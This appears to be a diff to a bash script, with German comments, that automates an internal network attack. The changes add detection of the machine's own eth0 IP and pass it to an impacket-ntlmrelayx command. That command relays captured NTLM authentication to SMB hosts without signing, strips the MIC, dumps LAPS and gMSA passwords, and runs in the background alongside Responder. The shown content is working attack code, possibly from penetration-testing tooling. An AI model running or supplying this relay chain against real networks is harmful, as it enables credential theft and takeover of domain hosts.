@@ -1,5 +1,8 @@
 #!/bin/bash
 
+IP=$(ip addr show eth0 | grep "inet " | cut -d '/' -f1 | cut -d ' ' -f6)
+echo 'eigene IP eth0: '$IP
+
 echo 'Netze zum scannen in /root/ipint.txt fuer nmap'
 
 if [ -s /root/ipint.txt ]; then
@@ -67,7 +70,7 @@ if [ -s /root/output/list/smb_sign_off.txt ]
 
 	#NTLMRelayX with 300sec timeout in bg to relay ntlm to hosts without signing enabled
 	echo 'Starting NTLM-Relay'
-	timeout 300 impacket-ntlmrelayx -6 -ts -ra --dump-laps --dump-gmsa -l loot -of /root/output/ntlm_relay_ntlmv2.txt --remove-mic -smb2support -tf /root/output/list/smb_sign_off.txt > /dev/null 2>&1 &
+	timeout 300 impacket-ntlmrelayx -ip $IP -6 -ts -ra --dump-laps --dump-gmsa -l loot -of /root/output/ntlm_relay_ntlmv2.txt --remove-mic -smb2support -tf /root/output/list/smb_sign_off.txt > /dev/null 2>&1 &
 	echo ''
 
 	#Declaring variables for each PID of Responder and NTLMRelayX
